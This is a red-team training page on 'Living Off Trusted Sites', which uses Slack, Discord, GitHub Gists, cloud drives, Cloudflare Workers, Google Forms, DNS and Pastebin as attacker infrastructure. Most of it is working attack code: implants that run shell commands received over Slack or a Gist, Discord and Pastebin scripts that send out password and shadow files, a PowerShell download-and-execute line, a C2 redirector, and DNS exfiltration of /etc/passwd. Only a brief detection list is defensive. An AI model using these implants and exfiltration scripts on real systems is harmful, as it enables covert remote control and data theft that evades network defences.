---
layout: training-page
title: "Living Off Trusted Sites (LOTS) — Red Team Academy"
module: "C2 Frameworks"
tags:
  - lots
  - c2
  - evasion
  - domain-fronting
  - trusted-infrastructure
  - exfil
page_key: "c2-lots-project"
render_with_liquid: false
---

# Living Off Trusted Sites (LOTS)

## The Core Concept

Defenders block unknown domains. They don't block GitHub, Microsoft, Google, Dropbox, or Slack. "Living Off Trusted Sites" (LOTS) turns that asymmetry into an attack primitive: use legitimate, highly-trusted services as C2 infrastructure, data exfiltration channels, or payload hosting — channels that network security teams are categorically unable to block without breaking business operations.

LOTS extends the LOLBAS (Living Off the Land Binaries and Scripts) concept from the endpoint to the network layer. Instead of avoiding suspicious binaries, you avoid suspicious network destinations.

## The LOTS Project Reference

The [LOTS Project](https://lots-project.com) maintains a curated list of websites that attackers can use for:

- **C2 communications** — command-and-control via legitimate service APIs
- **Payload delivery** — hosting malicious files on trusted platforms
- **Data exfiltration** — sending sensitive data through trusted channels
- **Reconnaissance** — gathering information via trusted services

Key categories from the project:

| Category | Examples |
|---|---|
| File Storage | GitHub, GitLab, OneDrive, Google Drive, Dropbox, Box |
| Messaging | Slack, Discord, Telegram, Microsoft Teams |
| Code/Pastebin | Pastebin, GitHub Gists, Hastebin, Rentry.co |
| CDN/Cloud | Cloudflare Workers, Azure Functions, AWS Lambda URLs |
| Productivity | Google Docs, Notion, Airtable, Trello |
| Communication | Twilio, SendGrid, Mailchimp webhooks |

## C2 via Slack

Slack is particularly valuable — it's present in most enterprise environments, uses HTTPS to Slack's servers (not yours), and any block of `slack.com` immediately breaks business operations.

### Using Slack as a C2 Channel

```python
# Concept: implant reads commands from a Slack channel, sends output back
# Requires a Slack bot token

import requests
import subprocess
import time

SLACK_TOKEN = "xoxb-your-bot-token"
CHANNEL_ID = "C01234ABCDE"  # C2 channel
BOT_ID = "U01234ABCDE"      # Bot's user ID

def get_commands():
    """Poll Slack channel for commands"""
    r = requests.get(
        "https://slack.com/api/conversations.history",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        params={"channel": CHANNEL_ID, "limit": 10}
    )
    return r.json().get("messages", [])

def send_output(text):
    """Send command output back to Slack"""
    requests.post(
        "https://slack.com/api/chat.postMessage",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        json={"channel": CHANNEL_ID, "text": f"```{text}```"}
    )

while True:
    for msg in get_commands():
        if msg.get("user") != BOT_ID:  # Not from the bot itself
            cmd = msg.get("text", "")
            if cmd.startswith("!"):
                result = subprocess.run(cmd[1:], shell=True, capture_output=True, text=True)
                send_output(result.stdout + result.stderr)
    time.sleep(10)
```

### Existing Tools with Slack C2

```bash
# Slackcat — exfil via Slack
# https://github.com/nicehash/slackcat
./slackcat --channel C2 --filename exfil.zip ./sensitive-data.zip

# C2 frameworks with Slack profiles:
# - Covenant: custom HTTP profile using Slack API endpoints
# - Merlin: Slack listener plugin
# - PoshC2: Slack C2 module
```

## C2 via Discord

Discord webhooks accept POST requests from any IP — no bot setup required, just a webhook URL.

### Discord Webhook for Exfiltration

```python
import requests
import subprocess

WEBHOOK = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"

def exfil(content, filename=None):
    """Send data to Discord via webhook"""
    if filename:
        # Send as file attachment
        requests.post(WEBHOOK, files={"file": (filename, content)})
    else:
        # Send as message (2000 char limit)
        requests.post(WEBHOOK, json={"content": f"```{content[:1900]}```"})

# Exfil a file
with open("C:\\Users\\victim\\Documents\\passwords.xlsx", "rb") as f:
    exfil(f.read(), "data.xlsx")

# Exfil command output
result = subprocess.run("ipconfig /all", shell=True, capture_output=True, text=True)
exfil(result.stdout, "network.txt")
```

### Discord C2 Framework

```bash
# DiscordC2 — dedicated Discord-based C2
git clone https://github.com/0xNinjaCyclone/Discord-C2
pip3 install -r requirements.txt

# Configure with your Discord bot token and server
python3 dc2.py --token BOT_TOKEN --guild GUILD_ID

# Features: file upload/download, shell execution, screenshot
```

## GitHub as C2 Channel

GitHub repositories can serve as dead-drop C2 — the implant reads commands from a file in a repo (or commit messages), executes them, and writes output back. GitHub's API traffic is allowed everywhere.

### GitHub Gist Dead Drop

```python
import requests
import subprocess
import json

GITHUB_TOKEN = "ghp_your_personal_access_token"
GIST_ID = "your_gist_id"

def read_command():
    """Read C2 command from GitHub Gist"""
    r = requests.get(
        f"https://api.github.com/gists/{GIST_ID}",
        headers={"Authorization": f"token {GITHUB_TOKEN}"}
    )
    gist = r.json()
    return gist["files"]["cmd.txt"]["content"]

def write_output(output):
    """Write output back to Gist"""
    requests.patch(
        f"https://api.github.com/gists/{GIST_ID}",
        headers={"Authorization": f"token {GITHUB_TOKEN}"},
        json={"files": {"output.txt": {"content": output}}}
    )

# Command loop
last_cmd = ""
while True:
    cmd = read_command()
    if cmd != last_cmd:  # New command
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        write_output(result.stdout + result.stderr)
        last_cmd = cmd
    time.sleep(30)
```

## Payload Hosting on Trusted Platforms

### GitHub / GitLab

```bash
# Host payloads on GitHub (raw content served via githubusercontent.com)
# Download: curl https://raw.githubusercontent.com/user/repo/main/payload.ps1

# Useful because:
# - githubusercontent.com is in every allowlist
# - GitHub provides free private repos (requires authentication to access)
# - CDN-backed, globally fast

# PowerShell download and execute from GitHub
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/user/repo/main/payload.ps1')"
```

### OneDrive / SharePoint

```bash
# Share a file via OneDrive → get direct download link
# Use direct download URL in payload stager

# Format: https://1drv.ms/u/s!SHAREID
# Or corporate SharePoint: https://company.sharepoint.com/sites/.../file.ps1

# Payload downloads from trusted Microsoft infrastructure
# Bypasses web proxy allowlists (*.microsoft.com, *.sharepoint.com typically allowed)
```

### Google Drive

```bash
# Share file in Google Drive → get direct download URL
# Direct URL: https://drive.google.com/uc?export=download&id=FILE_ID

# Stager using Google Drive
curl -L "https://drive.google.com/uc?export=download&id=1abc123" -o payload.exe
```

### Cloudflare Workers as Redirectors

```javascript
// worker.js — Cloudflare Worker as C2 redirector
// Sits in front of your actual C2, traffic comes from *.workers.dev

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Forward to real C2 server, hiding its IP
  const c2 = "https://your-real-c2.example.com"
  const url = new URL(request.url)
  url.hostname = "your-real-c2.example.com"
  
  return fetch(url.toString(), {
    method: request.method,
    headers: request.headers,
    body: request.body
  })
}
```

```bash
# Deploy Cloudflare Worker
# wrangler.toml configuration
name = "c2-redirector"
main = "worker.js"
compatibility_date = "2024-01-01"

# Deploy
npx wrangler deploy

# Traffic now comes from *.workers.dev — Cloudflare IP ranges
# Defender sees: requests to Cloudflare → legitimate cloud traffic
```

## Data Exfiltration via LOTS

### Exfil via Google Forms

```python
# Google Forms accepts anonymous POST submissions
# Each submission stored in Google Sheets — encrypted, Google-hosted

FORM_URL = "https://docs.google.com/forms/d/e/FORM_ID/formResponse"

def exfil_google_forms(data):
    # entry.XXXXXXXXXX = form field ID (from inspecting the form)
    requests.post(FORM_URL, data={
        "entry.1234567890": data[:10000]  # 10K char field limit
    })
```

### Exfil via DNS (Cloudflare/Google Resolvers)

```bash
# DNS exfiltration using legitimate resolvers
# Data encoded in subdomain queries — resolvers forward to authoritative server

# Set up NS delegation: *.exfil.yourdomain.com → your nameserver
# Capture queries server-side

# Encode and send data chunk by chunk
DATA=$(base64 /etc/passwd | tr -d '\n')
CHUNK_SIZE=30

for i in $(seq 0 $CHUNK_SIZE ${#DATA}); do
    CHUNK="${DATA:$i:$CHUNK_SIZE}"
    dig "${CHUNK}.exfil.yourdomain.com" @8.8.8.8 +short &
done

# Query using trusted DNS resolvers (8.8.8.8, 1.1.1.1)
# Network logs show: DNS queries to Google/Cloudflare resolvers — legitimate
```

### Exfil via Pastebin/Rentry

```python
import requests

def exfil_to_paste(data):
    """Exfil data via Pastebin API"""
    r = requests.post("https://pastebin.com/api/api_post.php", data={
        "api_dev_key": "YOUR_API_KEY",
        "api_option": "paste",
        "api_paste_code": data,
        "api_paste_private": "1",  # Private paste
        "api_paste_expire_date": "1H"  # Auto-expire
    })
    return r.text  # Returns paste URL

# Exfiltrate sensitive file
with open("shadow", "r") as f:
    url = exfil_to_paste(f.read())
    print(f"Data at: {url}")
```

## Detection Considerations

LOTS is difficult to detect because blocking requires breaking legitimate business services. Defenders rely on:

- **DLP (Data Loss Prevention)** — inspecting content of uploads to cloud services
- **CASB (Cloud Access Security Broker)** — monitoring API calls to specific services
- **Behavioral analysis** — detecting large uploads to unusual cloud destinations
- **Endpoint monitoring** — process making unusual API calls to collaboration tools
- **DNS analytics** — high-entropy subdomains or unusual query volumes

From a red team perspective, LOTS traffic is often the *last* thing defenders investigate because it looks so legitimate — making it ideal for long-duration operations where stealth is critical.

## Resources

- **LOTS Project**: [lots-project.com](https://lots-project.com) — curated, searchable list of trusted sites usable for attacker infrastructure
- Continuously updated by the security community as new services are identified
- Searchable by use case: C2, exfil, phishing, payload hosting
